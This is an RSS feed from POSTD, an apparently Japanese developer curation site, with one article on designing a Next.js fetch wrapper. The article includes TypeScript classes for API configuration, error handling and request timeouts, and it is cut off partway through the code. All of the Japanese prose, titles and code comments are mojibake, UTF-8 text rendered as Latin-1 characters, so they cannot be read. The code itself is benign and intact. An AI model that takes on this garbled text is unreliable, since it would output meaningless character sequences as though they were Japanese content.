<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[POSTD | ãƒ‹ã‚¸ãƒœãƒƒã‚¯ã‚¹ãŒé‹å–¶ã™ã‚‹ã‚¨ãƒ³ã‚¸ãƒ‹ã‚¢ã«å‘ã‘ãŸã‚­ãƒ¥ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ¡ãƒ‡ã‚£ã‚¢]]></title><description><![CDATA[POSTD ã¯ã€ãƒ‹ã‚¸ãƒœãƒƒã‚¯ã‚¹ãŒé‹å–¶ã™ã‚‹ã€ã‚¨ãƒ³ã‚¸ãƒ‹ã‚¢ã«å‘ã‘ãŸã‚­ãƒ¥ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ¡ãƒ‡ã‚£ã‚¢ã§ã™ã€‚ãƒ‹ã‚¸ãƒœãƒƒã‚¯ã‚¹ã¯Webã‚µãƒ¼ãƒ“ã‚¹ã®ä¼ç”»ã€åˆ¶ä½œã€é–‹ç™ºã€é‹ç”¨ã‚’ä¸€è²«ã—ã¦æ‹…ã†ãƒªã‚¯ãƒ«ãƒ¼ãƒˆã®100%å­ä¼šç¤¾ã§ã™ã€‚ ãƒªã‚¯ãƒ«ãƒ¼ãƒˆã‚°ãƒ«ãƒ¼ãƒ—ã®ã‚ªãƒ³ãƒ©ã‚¤ãƒ³ã‚µãƒ¼ãƒ“ã‚¹ã‚’ã¯ã˜ã‚ã€æ§˜ã€…ãªæ¥­ç¨®ãƒ»æ¥­ç•Œãƒ»æ¥­æ…‹ã®ã‚µãƒ¼ãƒ“ã‚¹é–‹ç™ºã‚’è¡Œã£ã¦ãŠã‚Šã¾ã™ã€‚]]></description><link>https://postd.cc</link><generator>GatsbyJS</generator><lastBuildDate>Thu, 25 Sep 2025 02:05:26 GMT</lastBuildDate><language>ja</language><atom:link href="https://postd.cc/feed/" rel="self" type="application/rss+xml"/><image><title>POSTD | ãƒ‹ã‚¸ãƒœãƒƒã‚¯ã‚¹ãŒé‹å–¶ã™ã‚‹ã‚¨ãƒ³ã‚¸ãƒ‹ã‚¢ã«å‘ã‘ãŸã‚­ãƒ¥ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ¡ãƒ‡ã‚£ã‚¢</title><link>https://postd.cc</link></image><item><title><![CDATA[Next.jsã®Fetch Wrapperï¼šãƒ™ã‚¹ãƒˆãƒ—ãƒ©ã‚¯ãƒ†ã‚£ã‚¹ã‚’å¾¹åº•è§£èª¬]]></title><description><![CDATA[æƒ³åƒã—ã¦ã¿ã¦ãã ã•ã„ã€‚ã‚ãªãŸã¯å¤¢ã®Next.jsã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’æ§‹ç¯‰ã—ã€ãƒã‚¤ãƒ†ã‚£ãƒ–ã®é–¢æ•°ã‚’ä½¿ã£ã¦æ¥½ã—ãAPIã‚³ãƒ¼ãƒ«ã‚’è¡Œã£ã¦ã„ã¾ã™ã€‚å…¨ã¦ãŒé †èª¿ã«è¦‹ãˆã¾ã—ãŸãŒã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’æœ¬ç•ªç’°å¢ƒã«ãƒ‡ãƒ—ãƒ­ã‚¤ã—ãŸâ€¦]]></description><link>https://postd.cc/fetch-wrapper-for-nextjs-a-deep-dive-into-best-practices-53dh/</link><guid isPermaLink="false">https://postd.cc/fetch-wrapper-for-nextjs-a-deep-dive-into-best-practices-53dh/</guid><category><![CDATA[é–‹ç™ºæ‰‹æ³•ãƒ»ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆç®¡ç†]]></category><category><![CDATA[React]]></category><category><![CDATA[Next.js]]></category><pubDate>Thu, 25 Sep 2025 00:00:01 GMT</pubDate><content:encoded><![CDATA[<p>æƒ³åƒã—ã¦ã¿ã¦ãã ã•ã„ã€‚ã‚ãªãŸã¯å¤¢ã®Next.jsã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’æ§‹ç¯‰ã—ã€ãƒã‚¤ãƒ†ã‚£ãƒ–ã®<code class="language-text">fetch</code>é–¢æ•°ã‚’ä½¿ã£ã¦æ¥½ã—ãAPIã‚³ãƒ¼ãƒ«ã‚’è¡Œã£ã¦ã„ã¾ã™ã€‚å…¨ã¦ãŒé †èª¿ã«è¦‹ãˆã¾ã—ãŸãŒã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’æœ¬ç•ªç’°å¢ƒã«ãƒ‡ãƒ—ãƒ­ã‚¤ã—ãŸé€”ç«¯ã€äº‹æ…‹ã¯ä¸€å¤‰ã—ã¾ã™ã€‚åå¾©çš„ãªã‚¨ãƒ©ãƒ¼å‡¦ç†ã®ã‚³ãƒ¼ãƒ‰ã«æººã‚Œã€ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã®ã‚ã¡ã“ã¡ã«æ•£ã‚‰ã°ã£ãŸèªè¨¼ãƒˆãƒ¼ã‚¯ãƒ³ã¨æ ¼é—˜ã—ã€ãªãœä¸€éƒ¨ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒã‚µãƒ¼ãƒãƒ¼ã§ã¯æˆåŠŸã™ã‚‹ã®ã«ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã§ã¯å¤±æ•—ã™ã‚‹ã®ã‹ã€ãã®ãƒ‡ãƒãƒƒã‚°ã«é«ªã‚’ã‹ãã‚€ã—ã‚‹æ—¥ã€…â€¦â€¦ã€‚</p>
<p>èãè¦šãˆãŒã‚ã‚Šã¾ã›ã‚“ã‹ï¼Ÿã‚ãªãŸã ã‘ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚Next.jsã¯<code class="language-text">fetch</code>ã‚’å¼·åŠ›ãªã‚­ãƒ£ãƒƒã‚·ãƒ¥æ©Ÿèƒ½ã‚„å†æ¤œè¨¼æ©Ÿèƒ½ã§æ‹¡å¼µã—ã¦ã„ã¾ã™ãŒã€ä¸­å¿ƒçš„ãªèª²é¡Œã¯æ®‹ã£ã¦ã„ã¾ã™ã€‚æœ¬ç•ªç’°å¢ƒã«å¯¾å¿œã—ãŸå …ç‰¢ãªAPIãƒ¬ã‚¤ãƒ¤ãƒ¼ã‚’æ§‹ç¯‰ã™ã‚‹ã«ã¯ã€ç´ ã®<code class="language-text">fetch</code>ã‚³ãƒ¼ãƒ«ã ã‘ã§ã¯ä¸ååˆ†ãªã®ã§ã™ã€‚</p>
<p>æœ¬è¨˜äº‹ã§ã¯ã€ã‚ãªãŸã®APIãƒ¬ã‚¤ãƒ¤ãƒ¼ã‚’é ­ç—›ã®ç¨®ã‹ã‚‰ã€æ‰±ã†ã®ãŒæ¥½ã—ããªã‚‹ã‚‚ã®ã¸ã¨å¤‰ãˆã‚‹ã€æœ¬ç•ªç’°å¢ƒå¯¾å¿œã®fetchãƒ©ãƒƒãƒ‘ãƒ¼ã‚’ä½œæˆã—ã¾ã™ã€‚ãã®æ§‹ç¯‰æ–¹æ³•ã ã‘ã§ãªãã€ãªãœãã‚Œãã‚Œã®æ±ºå®šãŒé‡è¦ãªã®ã‹ã€ãã—ã¦ãã‚ŒãŒNext.jsç‰¹æœ‰ã®å®Ÿè¡Œãƒ¢ãƒ‡ãƒ«ã«ã©ã†é©åˆã™ã‚‹ã®ã‹ã‚’æ˜ã‚Šä¸‹ã’ã¦ã„ãã¾ã—ã‚‡ã†ã€‚</p>
<h2>ç´ ã®fetchãŒæŠ±ãˆã‚‹å•é¡Œç‚¹ï¼ˆNext.jsã§ã‚‚ï¼‰</h2>
<p>ã¾ãšã€å¤šãã®é–‹ç™ºè€…ãŒæœ€åˆã«<code class="language-text">fetch</code>ã«å‡ºä¼šã£ãŸã¨ãã«æ›¸ãã‚³ãƒ¼ãƒ‰ã‚’è¦‹ã¦ã¿ã¾ã—ã‚‡ã†ã€‚</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token comment">// ãƒŠã‚¤ãƒ¼ãƒ–ãªã‚¢ãƒ—ãƒ­ãƒ¼ãƒ - æœ¬ç•ªç’°å¢ƒã§ã¯ä½¿ã‚ãªã„ã§ãã ã•ã„ï¼</span>
<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">getUser</span><span class="token punctuation">(</span><span class="token parameter">id</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> response <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/api/users/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>id<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> user <span class="token operator">=</span> <span class="token keyword">await</span> response<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> user<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ã“ã‚Œã¯ä¸€è¦‹ç„¡å®³ã«è¦‹ãˆã¾ã™ãŒã€æ™‚ã‚’åˆ»ã‚€æ™‚é™çˆ†å¼¾ã§ã™ã€‚APIãŒ404ã‚’è¿”ã™ã¨ã€æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token comment">// ã‚¨ãƒ©ãƒ¼ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã‹ã‚‰JSONã‚’ãƒ‘ãƒ¼ã‚¹ã—ã‚ˆã†ã¨ã™ã‚‹ã¨ã€ã‚¨ãƒ©ãƒ¼ãŒthrowã•ã‚Œã¾ã™</span>
<span class="token keyword">const</span> user <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">getUser</span><span class="token punctuation">(</span><span class="token string">'nonexistent-id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ğŸ’¥ ãƒ‰ã‚«ãƒ³ï¼</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>æ ¹æœ¬çš„ãªå•é¡Œã¯ã€<code class="language-text">fetch</code>ãŒ<strong>HTTPã®ã‚¨ãƒ©ãƒ¼ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ã‚’ä¾‹å¤–ã¨ã—ã¦æ‰±ã‚ãªã„</strong>ç‚¹ã«ã‚ã‚Šã¾ã™ã€‚404ã€500ã€ãã®ä»–ã®ã‚¨ãƒ©ãƒ¼ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ã‚‚ã€<code class="language-text">fetch</code>ã«ã¨ã£ã¦ã¯ã€ŒæˆåŠŸã—ãŸã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã¨è¦‹ãªã•ã‚Œã¾ã™ã€‚fetchãŒrejectã™ã‚‹ã®ã¯ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¨ãƒ©ãƒ¼ã®å ´åˆã®ã¿ã§ã™ã€‚ãã®ãŸã‚ã€Next.jsã‚’ä½¿ã£ã¦ã„ã‚‹å ´åˆã§ã‚‚ã€æ‰‹å‹•ã§<code class="language-text">response.ok</code>ã‚’ãƒã‚§ãƒƒã‚¯ã—ã€é©åˆ‡ã«ã‚¨ãƒ©ãƒ¼ã‚’å‡¦ç†ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚</p>
<p>ã—ã‹ã—ã€ã“ã‚Œã¯ã»ã‚“ã®å§‹ã¾ã‚Šã«éãã¾ã›ã‚“ã€‚å®Ÿéš›ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§ã¯ã€ä»¥ä¸‹ã®ã‚ˆã†ãªäº‹æŸ„ã‚‚å‡¦ç†ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚</p>
<ul>
<li>ä¿è­·ã•ã‚ŒãŸãƒ«ãƒ¼ãƒˆã®ãŸã‚ã®<strong>èªè¨¼ãƒˆãƒ¼ã‚¯ãƒ³</strong></li>
<li>ã‚¢ãƒ—ãƒªå…¨ä½“ã§<strong>ä¸€è²«ã—ãŸã‚¨ãƒ©ãƒ¼ãƒãƒ³ãƒ‰ãƒªãƒ³ã‚°</strong></li>
<li><strong>ãƒªã‚¯ã‚¨ã‚¹ãƒˆ/ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã®å¤‰æ›</strong>ï¼ˆJSONã®è‡ªå‹•ãƒ‘ãƒ¼ã‚¹ãªã©ï¼‰</li>
<li><strong>ãƒ­ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°çŠ¶æ…‹ã¨ã‚¨ãƒ©ãƒ¼ãƒã‚¦ãƒ³ãƒ€ãƒª</strong></li>
<li>å‹å®‰å…¨æ€§ã®ãŸã‚ã®<strong>TypeScriptã‚µãƒãƒ¼ãƒˆ</strong></li>
<li>Next.jsã«ãŠã‘ã‚‹ã‚µãƒ¼ãƒãƒ¼ã¨ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã®ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã«ã‚ˆã‚‹<strong>æŒ™å‹•ã®é•ã„</strong></li>
</ul>
<p>ã“ã‚Œã‚‰å…¨ã¦ã®å•é¡Œã‚’ã‚¨ãƒ¬ã‚¬ãƒ³ãƒˆã«è§£æ±ºã™ã‚‹ãƒ©ãƒƒãƒ‘ãƒ¼ã‚’æ§‹ç¯‰ã—ã¦ã„ãã¾ã—ã‚‡ã†ã€‚</p>
<h2>Fetchãƒ©ãƒƒãƒ‘ãƒ¼ã®ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£è¨­è¨ˆ</h2>
<p>ã‚³ãƒ¼ãƒ‰ã«å…¥ã‚‹å‰ã«ã€ç†æƒ³çš„ãªãƒ©ãƒƒãƒ‘ãƒ¼ãŒæä¾›ã™ã¹ãã‚‚ã®ã‚’è€ƒãˆã¦ã¿ã¾ã—ã‚‡ã†ã€‚</p>
<ol>
<li>HTTPã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ã‚³ãƒ¼ãƒ‰ã®<strong>è‡ªå‹•ã‚¨ãƒ©ãƒ¼ãƒãƒ³ãƒ‰ãƒªãƒ³ã‚°</strong></li>
<li>é©åˆ‡ãªã‚¨ãƒ©ãƒ¼å‡¦ç†ã‚’å‚™ãˆãŸ<strong>çµ„ã¿è¾¼ã¿ã®JSONãƒ‘ãƒ¼ã‚¹</strong></li>
<li><strong>èªè¨¼ãƒˆãƒ¼ã‚¯ãƒ³ã®ç®¡ç†</strong></li>
<li>é©åˆ‡ãªå‹ä»˜ã‘ã«ã‚ˆã‚‹<strong>TypeScriptã‚µãƒãƒ¼ãƒˆ</strong></li>
<li><strong>Next.jsã®ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆèªè­˜</strong>ï¼ˆã‚µãƒ¼ãƒãƒ¼ vs. ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆï¼‰</li>
<li>ã•ã¾ã–ã¾ãªç’°å¢ƒã«å¯¾å¿œã§ãã‚‹<strong>æ‹¡å¼µå¯èƒ½ãªè¨­å®š</strong></li>
<li>è‡ªç„¶ã«ä½¿ãˆã‚‹<strong>ä¸€è²«ã—ãŸAPI</strong></li>
</ol>
<p>ã“ã®ãƒ©ãƒƒãƒ‘ãƒ¼ã‚’ã€é€€å±ˆã§ã‚¨ãƒ©ãƒ¼ã‚’èµ·ã“ã—ã‚„ã™ã„ã‚¿ã‚¹ã‚¯ã‚’å…¨ã¦å‡¦ç†ã—ã¤ã¤ã€ã‚¯ãƒªãƒ¼ãƒ³ã§äºˆæ¸¬å¯èƒ½ãªã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã‚’æä¾›ã—ã¦ãã‚Œã‚‹ã€è¦ªåˆ‡ãªã‚¢ã‚·ã‚¹ã‚¿ãƒ³ãƒˆã ã¨è€ƒãˆã¦ãã ã•ã„ã€‚</p>
<h2>åŸºç›¤ã®æ§‹ç¯‰ï¼šãƒ©ãƒƒãƒ‘ãƒ¼ã®ã‚³ã‚¢æ§‹é€ </h2>
<p>ã¾ãšã¯åŸºæœ¬çš„ãªæ§‹é€ ã‹ã‚‰å§‹ã‚ã¾ã—ã‚‡ã†ã€‚Next.jsã®æ…£ç¿’ã«å¾“ã„ã€<code class="language-text">lib/api.ts</code>ã¨ã„ã†ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä½œæˆã—ã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="ts"><pre style="counter-reset: linenumber NaN" class="language-ts line-numbers"><code class="language-ts"><span class="token comment">// lib/api.ts</span>
<span class="token keyword">interface</span> <span class="token class-name">ApiConfig</span> <span class="token punctuation">{</span>
  baseUrl<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span>
  defaultHeaders<span class="token operator">?</span><span class="token operator">:</span> Record<span class="token operator">&lt;</span><span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token builtin">string</span><span class="token operator">></span><span class="token punctuation">;</span>
  timeout<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">number</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">interface</span> <span class="token class-name">ApiResponse<span class="token operator">&lt;</span><span class="token constant">T</span> <span class="token operator">=</span> <span class="token builtin">any</span><span class="token operator">></span></span> <span class="token punctuation">{</span>
  data<span class="token operator">:</span> <span class="token constant">T</span><span class="token punctuation">;</span>
  status<span class="token operator">:</span> <span class="token builtin">number</span><span class="token punctuation">;</span>
  headers<span class="token operator">:</span> Headers<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">ApiError</span> <span class="token keyword">extends</span> <span class="token class-name">Error</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span>
    message<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">,</span>
    <span class="token keyword">public</span> status<span class="token operator">:</span> <span class="token builtin">number</span><span class="token punctuation">,</span>
    <span class="token keyword">public</span> response<span class="token operator">?</span><span class="token operator">:</span> Response
  <span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">super</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'ApiError'</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">ApiClient</span> <span class="token punctuation">{</span>
  <span class="token keyword">private</span> config<span class="token operator">:</span> Required<span class="token operator">&lt;</span>ApiConfig<span class="token operator">></span><span class="token punctuation">;</span>

  <span class="token function">constructor</span><span class="token punctuation">(</span>config<span class="token operator">:</span> ApiConfig <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>config <span class="token operator">=</span> <span class="token punctuation">{</span>
      baseUrl<span class="token operator">:</span> config<span class="token punctuation">.</span>baseUrl <span class="token operator">||</span> <span class="token string">''</span><span class="token punctuation">,</span>
      defaultHeaders<span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token string-property property">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'application/json'</span><span class="token punctuation">,</span>
        <span class="token operator">...</span>config<span class="token punctuation">.</span>defaultHeaders<span class="token punctuation">,</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      timeout<span class="token operator">:</span> config<span class="token punctuation">.</span>timeout <span class="token operator">||</span> <span class="token number">10000</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">private</span> <span class="token keyword">async</span> <span class="token generic-function"><span class="token function">makeRequest</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>
    endpoint<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">,</span>
    options<span class="token operator">:</span> RequestInit <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
  <span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Promise</span><span class="token operator">&lt;</span>ApiResponse<span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">>></span> <span class="token punctuation">{</span>
    <span class="token comment">// æ¬¡ã«ã“ã‚Œã‚’å®Ÿè£…ã—ã¾ã™</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p><strong>ãªãœã‚¯ãƒ©ã‚¹ãƒ™ãƒ¼ã‚¹ã®ã‚¢ãƒ—ãƒ­ãƒ¼ãƒãªã®ã‹ï¼Ÿ</strong> Reactã§ã¯é–¢æ•°å‹ã‚¢ãƒ—ãƒ­ãƒ¼ãƒãŒäººæ°—ã§ã™ãŒã€ã‚¯ãƒ©ã‚¹ã«ã¯ã„ãã¤ã‹ã®åˆ©ç‚¹ãŒã‚ã‚Šã¾ã™ã€‚</p>
<ul>
<li><strong>çŠ¶æ…‹ç®¡ç†</strong>: è¨­å®šã‚„ã€å ´åˆã«ã‚ˆã£ã¦ã¯ã‚­ãƒ£ãƒƒã‚·ãƒ¥ãƒ‡ãƒ¼ã‚¿ã‚’ä¿å­˜ã§ãã¾ã™ã€‚</li>
<li><strong>ãƒ¡ã‚½ãƒƒãƒ‰ãƒã‚§ãƒ¼ãƒ³</strong>: æµã‚Œã‚‹ã‚ˆã†ãªAPIãƒ¡ã‚½ãƒƒãƒ‰ã‚’å¾Œã‹ã‚‰ã§ã‚‚è¿½åŠ ã§ãã¾ã™ã€‚</li>
<li><strong>ç¶™æ‰¿</strong>: ãƒãƒ¼ãƒ ã¯ç‰¹å®šã®ãƒ¦ãƒ¼ã‚¹ã‚±ãƒ¼ã‚¹ã®ãŸã‚ã«ãƒ™ãƒ¼ã‚¹ã‚¯ãƒ©ã‚¹ã‚’æ‹¡å¼µã§ãã¾ã™ã€‚</li>
<li><strong>ã‚«ãƒ—ã‚»ãƒ«åŒ–</strong>: privateãƒ¡ã‚½ãƒƒãƒ‰ã§å®Ÿè£…ã®è©³ç´°ã‚’éš è”½ã§ãã¾ã™ã€‚</li>
</ul>
<h2>ãƒ©ãƒƒãƒ‘ãƒ¼ã®å¿ƒè‡“éƒ¨ï¼šãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ­ã‚¸ãƒƒã‚¯</h2>
<p>ã§ã¯ã€ã‚³ã‚¢ã¨ãªã‚‹ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ­ã‚¸ãƒƒã‚¯ã‚’å®Ÿè£…ã—ã¾ã—ã‚‡ã†ã€‚ã“ã“ãŒè‚å¿ƒãªéƒ¨åˆ†ã§ã™ã€‚</p>
<div class="gatsby-highlight" data-language="ts"><pre style="counter-reset: linenumber NaN" class="language-ts line-numbers"><code class="language-ts"><span class="token comment">// lib/api.ts (ç¶šã)</span>
<span class="token keyword">class</span> <span class="token class-name">ApiClient</span> <span class="token punctuation">{</span>
  <span class="token comment">// ... å‰ã®ã‚³ãƒ¼ãƒ‰</span>

  <span class="token keyword">private</span> <span class="token keyword">async</span> <span class="token generic-function"><span class="token function">makeRequest</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>
    endpoint<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">,</span>
    options<span class="token operator">:</span> RequestInit <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
  <span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Promise</span><span class="token operator">&lt;</span>ApiResponse<span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">>></span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">buildUrl</span><span class="token punctuation">(</span>endpoint<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> requestOptions <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">buildRequestOptions</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">try</span> <span class="token punctuation">{</span>
      <span class="token comment">// ã‚¿ã‚¤ãƒ ã‚¢ã‚¦ãƒˆç”¨ã®AbortControllerã‚’ä½œæˆ</span>
      <span class="token keyword">const</span> controller <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AbortController</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">const</span> timeoutId <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> controller<span class="token punctuation">.</span><span class="token function">abort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>config<span class="token punctuation">.</span>timeout<span class="token punctuation">)</span><span class="token punctuation">;</span>

      <span class="token keyword">const</span> response <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token punctuation">{</span>
        <span class="token operator">...</span>requestOptions<span class="token punctuation">,</span>
        signal<span class="token operator">:</span> controller<span class="token punctuation">.</span>signal<span class="token punctuation">,</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

      <span class="token function">clearTimeout</span><span class="token punctuation">(</span>timeoutId<span class="token punctuation">)</span><span class="token punctuation">;</span>

      <span class="token comment">// ã“ã“ãŒã‚­ãƒ¼ãƒã‚¤ãƒ³ãƒˆã§ã™ã€‚ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ã‚’ãƒã‚§ãƒƒã‚¯ã—ã€ã‚¨ãƒ©ãƒ¼ã®å ´åˆã¯throwã—ã¾ã™</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>response<span class="token punctuation">.</span>ok<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ApiError</span><span class="token punctuation">(</span>
          <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">HTTP </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>response<span class="token punctuation">.</span>status<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>response<span class="token punctuation">.</span>statusText<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
          response<span class="token punctuation">.</span>status<span class="token punctuation">,</span>
          response
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>

      <span class="token comment">// JSONã‚’å®‰å…¨ã«ãƒ‘ãƒ¼ã‚¹</span>
      <span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token generic-function"><span class="token function">parseResponse</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>

      <span class="token keyword">return</span> <span class="token punctuation">{</span>
        data<span class="token punctuation">,</span>
        status<span class="token operator">:</span> response<span class="token punctuation">.</span>status<span class="token punctuation">,</span>
        headers<span class="token operator">:</span> response<span class="token punctuation">.</span>headers<span class="token punctuation">,</span>
      <span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>error<span class="token punctuation">.</span>name <span class="token operator">===</span> <span class="token string">'AbortError'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ApiError</span><span class="token punctuation">(</span><span class="token string">'Request timeout'</span><span class="token punctuation">,</span> <span class="token number">408</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
